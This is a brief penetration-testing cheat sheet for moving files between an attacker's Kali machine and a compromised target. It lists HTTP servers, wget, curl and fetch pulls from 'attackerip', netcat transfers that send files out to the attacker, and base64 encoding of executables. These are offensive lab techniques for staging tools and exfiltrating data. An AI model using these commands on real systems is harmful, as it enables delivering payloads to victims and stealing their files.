# Python SimpleHTTPServer

## on Attacker

```
python -m SimpleHTTPServer
```

## python3

```
python3 -m http.server
```

## on target

```
wget <attackerip>:8000/filename
```



# Apache

## on Attacker

```
cp filetosend.txt /var/www/html
service apache2 start
```

## on target

```
wget http://attackerip/file
curl http://attackerip/file > file
fetch http://attackerip/file        # on BSD
```



# Netcat (From Target to Kali)

## Listen on Kali

```
nc -lvp 4444 > file
```

## Send from Target machine

```
nc <kali_ip> 4444 < file
```



# Netcat (From Kali to Target)

## on target, wait for the file

```
nc -nvlp 55555 > file
```

## on kali, push the file

```
nc $victimip 55555 < file
```


# Extra:

> To send the executable file to your machine:

base64 executable

- copy the output
- paste it in a file called file.txt
- decode it and create the executable

```
base64 -d file.txt > executable
```
